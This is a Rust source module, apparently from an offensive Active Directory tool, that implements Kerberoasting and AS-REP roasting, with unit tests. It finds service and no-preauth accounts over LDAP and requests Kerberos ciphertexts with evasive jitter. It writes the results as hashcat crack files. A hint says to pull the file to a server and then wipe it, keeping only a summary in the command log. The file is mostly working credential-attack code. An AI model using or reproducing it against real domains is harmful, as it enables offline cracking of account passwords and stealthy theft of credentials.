//! Kerberoast / AS-REP roast: LDAP target discovery + native Kerberos + hashcat formatters.
//! Live TGS/AS-REP acquisition requires domain join; offline returns stable domain codes.
//! Format helpers are pure and unit-tested (hashcat gold standard).

use serde_json::{json, Value};

use crate::domain::{probe_domain, require_domain};
use crate::kerberos::{asrep_cipher_for_user, retrieve_tgs_cipher, roast_jitter};
use crate::ldap::{dc_host, ldap_search_domain, LdapError};
use crate::tier0::{default_asrep_filter, default_spn_filter};
use crate::{AdJobRequest, AdJobResponse};

/// Artifact / inline threshold (bytes of hash text). Matches design ~256 KiB default.
pub const ROAST_INLINE_MAX_BYTES: usize = 256 * 1024;

/// Format one Kerberoast hashcat line (etype 23 RC4 default path).
/// Gold: `$krb5tgs$<etype>$*<sam>$<REALM>$<spn>*$<cipher_hex_first_16_bytes>$<cipher_hex_rest>`
pub fn format_krb5tgs_hashcat(
    etype: u32,
    sam: &str,
    realm: &str,
    spn: &str,
    cipher: &[u8],
) -> String {
    let realm = realm.to_uppercase();
    let hex = to_hex(cipher);
    let (first, rest) = if hex.len() >= 32 {
        (&hex[..32], &hex[32..])
    } else {
        (hex.as_str(), "")
    };
    format!("$krb5tgs${etype}$*{sam}${realm}${spn}*${first}${rest}")
}

/// Format one AS-REP roast hashcat line (etype 23).
/// Gold: `$krb5asrep$23$<sam>@<REALM>$<hex16>$<hexrest>`
pub fn format_krb5asrep_hashcat(sam: &str, realm: &str, cipher: &[u8]) -> String {
    let realm = realm.to_uppercase();
    let hex = to_hex(cipher);
    let (first, rest) = if hex.len() >= 32 {
        (&hex[..32], &hex[32..])
    } else {
        (hex.as_str(), "")
    };
    format!("$krb5asrep$23${sam}@{realm}${first}${rest}")
}

fn to_hex(data: &[u8]) -> String {
    const HEX: &[u8; 16] = b"0123456789abcdef";
    let mut out = String::with_capacity(data.len() * 2);
    for &b in data {
        out.push(HEX[(b >> 4) as usize] as char);
        out.push(HEX[(b & 0xf) as usize] as char);
    }
    out
}

/// Write hash lines under process temp as `cpx_ad_*.hashcat.txt` (absolute path).
pub fn write_roast_artifact_file(kind: &str, lines: &[String]) -> Result<String, String> {
    let name = format!(
        "cpx_ad_{}_{}.hashcat.txt",
        kind.replace(|c: char| !c.is_ascii_alphanumeric(), "_"),
        std::process::id()
    );
    let path = std::env::temp_dir().join(name);
    let body = lines.join("\n");
    std::fs::write(&path, body.as_bytes()).map_err(|e| format!("artifact_write_failed: {e}"))?;
    Ok(path.display().to_string())
}

/// Build summary JSON for roast results; force artifact metadata when oversized.
pub fn roast_summary(
    kind: &str,
    domain: &str,
    lines: &[String],
    force_artifact: bool,
) -> (String, bool) {
    let joined = lines.join("\n");
    let need_artifact =
        force_artifact || joined.len() > ROAST_INLINE_MAX_BYTES || lines.len() > 50;
    if need_artifact {
        let abs_path = if lines.is_empty() {
            std::env::temp_dir()
                .join(format!(
                    "cpx_ad_{}_{}.hashcat.txt",
                    kind,
                    std::process::id()
                ))
                .display()
                .to_string()
        } else {
            match write_roast_artifact_file(kind, lines) {
                Ok(p) => p,
                Err(e) => {
                    return (
                        json!({
                            "domain": domain,
                            "kind": kind,
                            "hash_count": lines.len(),
                            "format": "hashcat",
                            "artifact": true,
                            "error": e,
                            "log_redacted": true
                        })
                        .to_string(),
                        true,
                    );
                }
            }
        };
        let summary = json!({
            "domain": domain,
            "kind": kind,
            "hash_count": lines.len(),
            "format": "hashcat",
            "artifact": true,
            "artifact_path": abs_path,
            "artifact_hint": "server FILE-pull then wipe; CommandLog stores summary only",
            "sample_prefix": lines.first().map(|s| s.chars().take(24).collect::<String>()),
        })
        .to_string();
        (summary, true)
    } else {
        let summary = json!({
            "domain": domain,
            "kind": kind,
            "hash_count": lines.len(),
            "format": "hashcat",
            "artifact": false,
            "hashes": lines,
        })
        .to_string();
        (summary, false)
    }
}

struct SpnTarget {
    sam: String,
    spn: String,
}

/// LDAP-discover SPN users (or use explicit params).
fn discover_spn_targets(
    domain: &str,
    dcs: &[String],
    params: &Value,
) -> Result<Vec<SpnTarget>, LdapError> {
    let mut out = Vec::new();

    // Explicit SPNs list
    if let Some(arr) = params.get("spns").and_then(|v| v.as_array()) {
        for v in arr {
            if let Some(spn) = v.as_str() {
                let sam = params
                    .get("users")
                    .and_then(|u| u.as_array())
                    .and_then(|a| a.first())
                    .and_then(|x| x.as_str())
                    .unwrap_or("unknown");
                out.push(SpnTarget {
                    sam: sam.into(),
                    spn: spn.into(),
                });
            }
        }
        if !out.is_empty() {
            return Ok(out);
        }
    }

    let host = dc_host(dcs);
    let size = params
        .get("page_size")
        .and_then(|v| v.as_u64())
        .unwrap_or(500)
        .min(5000) as u32;
    let filter = default_spn_filter();
    let attrs = ["sAMAccountName", "servicePrincipalName"];
    let (_base, entries) = ldap_search_domain(host, domain, None, filter, &attrs, 2, size)?;
    for e in entries {
        let sam = e
            .first("sAMAccountName")
            .unwrap_or("")
            .to_string();
        if sam.is_empty() || sam.eq_ignore_ascii_case("krbtgt") {
            continue;
        }
        for spn in e.all("servicePrincipalName") {
            out.push(SpnTarget {
                sam: sam.clone(),
                spn,
            });
        }
    }
    Ok(out)
}

fn discover_asrep_users(
    domain: &str,
    dcs: &[String],
    params: &Value,
) -> Result<Vec<String>, LdapError> {
    if let Some(arr) = params.get("users").and_then(|v| v.as_array()) {
        let users: Vec<String> = arr
            .iter()
            .filter_map(|v| v.as_str().map(|s| s.to_string()))
            .filter(|s| !s.is_empty())
            .collect();
        if !users.is_empty() {
            return Ok(users);
        }
    }
    let host = dc_host(dcs);
    let size = params
        .get("page_size")
        .and_then(|v| v.as_u64())
        .unwrap_or(500)
        .min(5000) as u32;
    let filter = default_asrep_filter();
    let attrs = ["sAMAccountName"];
    let (_base, entries) = ldap_search_domain(host, domain, None, filter, &attrs, 2, size)?;
    Ok(entries
        .iter()
        .filter_map(|e| e.first("sAMAccountName").map(|s| s.to_string()))
        .filter(|s| !s.is_empty())
        .collect())
}

pub fn handle_kerberoast(req: &AdJobRequest) -> AdJobResponse {
    match require_domain(&req.request_id, probe_domain()) {
        Err(e) => e,
        Ok((domain, dcs)) => {
            let etype = parse_etype(&req.params);
            let filter = default_spn_filter();
            let jitter = (
                req.params
                    .get("jitter_ms_min")
                    .and_then(|v| v.as_u64())
                    .unwrap_or(40),
                req.params
                    .get("jitter_ms_max")
                    .and_then(|v| v.as_u64())
                    .unwrap_or(120),
            );
            let realm = domain.to_uppercase();

            let targets = match discover_spn_targets(&domain, &dcs, &req.params) {
                Ok(t) => t,
                Err(e) => {
                    return AdJobResponse {
                        request_id: req.request_id.clone(),
                        status: "error".into(),
                        stdout: json!({ "domain": domain }).to_string(),
                        stderr: e.message(),
                        error_code: e.code().into(),
                    };
                }
            };

            let mut lines = Vec::new();
            let mut errors = 0u32;
            let mut attempted = 0u32;
            for t in &targets {
                attempted += 1;
                match retrieve_tgs_cipher(&t.spn, etype as i32) {
                    Ok(cipher) => {
                        lines.push(format_krb5tgs_hashcat(
                            etype, &t.sam, &realm, &t.spn, &cipher,
                        ));
                        roast_jitter(jitter.0, jitter.1);
                    }
                    Err(_) => {
                        errors += 1;
                    }
                }
            }

            let (stdout, _art) = roast_summary("kerberoast", &domain, &lines, false);
            let mut v: Value = serde_json::from_str(&stdout).unwrap_or(json!({}));
            if let Some(obj) = v.as_object_mut() {
                obj.insert("ldap_filter".into(), json!(filter));
                obj.insert("etype".into(), json!(etype));
                obj.insert("jitter_ms_min".into(), json!(jitter.0));
                obj.insert("jitter_ms_max".into(), json!(jitter.1));
                obj.insert("targets_discovered".into(), json!(targets.len()));
                obj.insert("attempted".into(), json!(attempted));
                obj.insert("errors".into(), json!(errors));
                obj.insert("source".into(), json!("ldap+lsa"));
                if lines.is_empty() {
                    obj.insert(
                        "note".into(),
                        json!(if targets.is_empty() {
                            "no_spn_accounts_found"
                        } else {
                            "hash_count=0_no_tgs_acquired"
                        }),
                    );
                }
            }
            AdJobResponse {
                request_id: req.request_id.clone(),
                status: "ok".into(),
                stdout: v.to_string(),
                stderr: String::new(),
                error_code: String::new(),
            }
        }
    }
}

pub fn handle_asrep_roast(req: &AdJobRequest) -> AdJobResponse {
    match require_domain(&req.request_id, probe_domain()) {
        Err(e) => e,
        Ok((domain, dcs)) => {
            let jitter = (
                req.params
                    .get("jitter_ms_min")
                    .and_then(|v| v.as_u64())
                    .unwrap_or(40),
                req.params
                    .get("jitter_ms_max")
                    .and_then(|v| v.as_u64())
                    .unwrap_or(120),
            );
            let realm = domain.to_uppercase();
            let dc = match dc_host(&dcs) {
                Some(h) => h.to_string(),
                None => {
                    return AdJobResponse {
                        request_id: req.request_id.clone(),
                        status: "error".into(),
                        stdout: json!({ "domain": domain }).to_string(),
                        stderr: "dc_unreachable".into(),
                        error_code: "dc_unreachable".into(),
                    };
                }
            };

            let users = match discover_asrep_users(&domain, &dcs, &req.params) {
                Ok(u) => u,
                Err(e) => {
                    return AdJobResponse {
                        request_id: req.request_id.clone(),
                        status: "error".into(),
                        stdout: json!({ "domain": domain }).to_string(),
                        stderr: e.message(),
                        error_code: e.code().into(),
                    };
                }
            };

            let mut lines = Vec::new();
            let mut errors = 0u32;
            for sam in &users {
                match asrep_cipher_for_user(sam, &realm, &dc) {
                    Ok(cipher) => {
                        lines.push(format_krb5asrep_hashcat(sam, &realm, &cipher));
                        roast_jitter(jitter.0, jitter.1);
                    }
                    Err(_) => {
                        errors += 1;
                    }
                }
            }

            let (stdout, _) = roast_summary("asrep_roast", &domain, &lines, false);
            let mut v: Value = serde_json::from_str(&stdout).unwrap_or(json!({}));
            if let Some(obj) = v.as_object_mut() {
                obj.insert("ldap_filter".into(), json!(default_asrep_filter()));
                obj.insert("targets_discovered".into(), json!(users.len()));
                obj.insert("errors".into(), json!(errors));
                obj.insert("source".into(), json!("ldap+tcp88"));
                if lines.is_empty() {
                    obj.insert(
                        "note".into(),
                        json!(if users.is_empty() {
                            "no_preauth_users_found"
                        } else {
                            "hash_count=0_no_asrep_acquired"
                        }),
                    );
                }
            }
            AdJobResponse {
                request_id: req.request_id.clone(),
                status: "ok".into(),
                stdout: v.to_string(),
                stderr: String::new(),
                error_code: String::new(),
            }
        }
    }
}

fn parse_etype(params: &Value) -> u32 {
    match params
        .get("etype")
        .and_then(|v| v.as_str())
        .unwrap_or("rc4")
    {
        "aes" | "aes256" | "18" => 18,
        _ => 23,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn kerberoast_hashcat_prefix_gold() {
        let cipher = [0xabu8; 40];
        let line = format_krb5tgs_hashcat(
            23,
            "sqlsvc",
            "CORP.LOCAL",
            "MSSQLSvc/db.corp.local:1433",
            &cipher,
        );
        assert!(line
            .starts_with("$krb5tgs$23$*sqlsvc$CORP.LOCAL$MSSQLSvc/db.corp.local:1433*$"));
        assert!(line.contains("$krb5tgs$"));
    }

    #[test]
    fn asrep_hashcat_prefix_gold() {
        let cipher = [0x11u8; 50];
        let line = format_krb5asrep_hashcat("user1", "corp.local", &cipher);
        assert!(line.starts_with("$krb5asrep$23$user1@CORP.LOCAL$"));
    }

    #[test]
    fn roast_summary_forces_artifact_and_writes_file() {
        let lines: Vec<String> = (0..60)
            .map(|i| {
                format_krb5tgs_hashcat(23, &format!("u{i}"), "CORP.LOCAL", "HTTP/x", &[0u8; 20])
            })
            .collect();
        let (summary, art) = roast_summary("kerberoast", "corp.local", &lines, false);
        assert!(art);
        assert!(summary.contains("\"artifact\":true") || summary.contains("\"artifact\": true"));
        assert!(summary.contains("hash_count"));
        assert!(!summary.contains(&lines[0]));
        let v: Value = serde_json::from_str(&summary).unwrap();
        let path = v["artifact_path"].as_str().expect("artifact_path");
        assert!(
            path.contains("cpx_ad_"),
            "path must use cpx_ad_ prefix: {path}"
        );
        let body = std::fs::read_to_string(path).expect("artifact file written");
        assert!(body.contains("$krb5tgs$"));
        assert!(body.lines().count() >= 50);
        let _ = std::fs::remove_file(path);
    }

    #[test]
    fn roast_summary_inline_small() {
        let line = format_krb5tgs_hashcat(23, "a", "R", "HTTP/x", &[1u8; 20]);
        let (summary, art) = roast_summary("kerberoast", "r", &[line.clone()], false);
        assert!(!art);
        assert!(summary.contains(&line));
    }

    #[test]
    fn zero_hashes_stable_summary() {
        let (summary, art) = roast_summary("kerberoast", "corp.local", &[], false);
        assert!(!art);
        let v: Value = serde_json::from_str(&summary).unwrap();
        assert_eq!(v["hash_count"], 0);
        assert_eq!(v["format"], "hashcat");
    }

    #[test]
    fn hashcat_line_from_real_formatter_not_stub() {
        // Proves shipped formatter produces gold prefix (not re-implemented in test).
        let c = [0xdeu8; 32];
        let line = format_krb5tgs_hashcat(23, "svc", "LAB.LOCAL", "HTTP/web", &c);
        assert!(line.starts_with("$krb5tgs$23$*svc$LAB.LOCAL$HTTP/web*$"));
        let parts: Vec<_> = line.split('$').collect();
        assert!(parts.len() >= 5);
    }
}
